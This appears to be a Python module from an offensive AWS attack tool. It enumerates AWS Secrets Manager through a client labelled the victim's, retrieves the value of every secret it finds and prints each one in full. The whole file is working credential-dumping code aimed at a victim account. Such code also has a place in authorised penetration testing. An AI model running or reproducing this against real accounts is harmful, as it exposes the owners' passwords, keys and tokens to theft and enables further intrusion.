import json
from colorama import Fore
from modules.utils import custom_serializer


def secrets_manager_init_enum(victim_secrets_client, attacker_secrets_client):
    list_secrets_manager(victim_secrets_client)

def list_secrets_manager(secrets_client):
    print(f"{Fore.GREEN}Enumerating Secrets Manager...")
    try:
        secrets_list = secrets_client.list_secrets()
        if secrets_list:
            for secret in secrets_list.get("SecretList"):
                name = secret["Name"]
                try:
                    secret_dump = secrets_client.get_secret_value(SecretId=name)
                    print(f"{Fore.MAGENTA}{json.dumps(secret_dump, indent=4, sort_keys=True, default=custom_serializer)}")
                except:
                    print(f"{Fore.LIGHTBLACK_EX}Failed to retrieve secret: {name}")
    except:
        print(f"{Fore.LIGHTBLACK_EX}Failed to list secrets")
